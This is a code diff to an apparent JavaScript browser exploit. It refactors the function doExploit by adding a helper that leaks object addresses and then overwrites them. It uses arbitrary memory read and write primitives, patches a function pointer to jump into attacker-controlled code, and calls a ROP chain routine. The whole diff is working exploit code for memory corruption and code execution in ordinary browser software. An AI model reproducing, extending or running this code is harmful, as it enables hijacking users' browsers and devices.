@@ -157,6 +157,12 @@ function doExploit(bufi, buf, stale, temp) {
 		leakee['b'] = obj;
 		return read8(leakaddr, 4);
 	}
+	function getAddrDestroy(obj) {
+		leakee['b'] = obj;
+		var addr = read8(leakaddr, 4);
+		write8([0x00000000, 0xffff0000], leakaddr, 4);
+		return addr;
+	}
 
 	log('Clearing useless buffers');
 	// Give ourselves a 'buffer' of 100 buffers around the one we know we hit, for safety
@@ -295,11 +301,8 @@ function doExploit(bufi, buf, stale, temp) {
 		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
 
 		log('Assigned.  Jumping.');
-		leakee['b'] = func.apply(0x101);
+		var sp = getAddrDestroy(func.apply(0x101));
 		log('Jumped back.');
-
-		var sp = read8(leakaddr, 4);
-		write8([0x00000000, 0xffff0000], leakaddr, 4);
 
 		log('Got stack pointer: ' + paddr(sp));
 
@@ -459,11 +462,8 @@ function doExploit(bufi, buf, stale, temp) {
 		sp = add2(sp, 0x8000);
 
 		log('Assigned.  Jumping.');
-		leakee['b'] = func.apply(0x101);
+		var ret = getAddrDestroy(func.apply(0x101));
 		log('Jumped back.');
-
-		var ret = read8(leakaddr, 4);
-		write8([0x00000000, 0xffff0000], leakaddr, 4);
 
 		write8(curptr, funcaddr, 8);
 
@@ -501,6 +501,7 @@ function doExploit(bufi, buf, stale, temp) {
 		write4(0, strbuf, str.length >> 2);
 	}
 
+	window.a = function() {};
 	holyrop(strlen_fptr, [strbuf]);
 	free(strbuf);
 
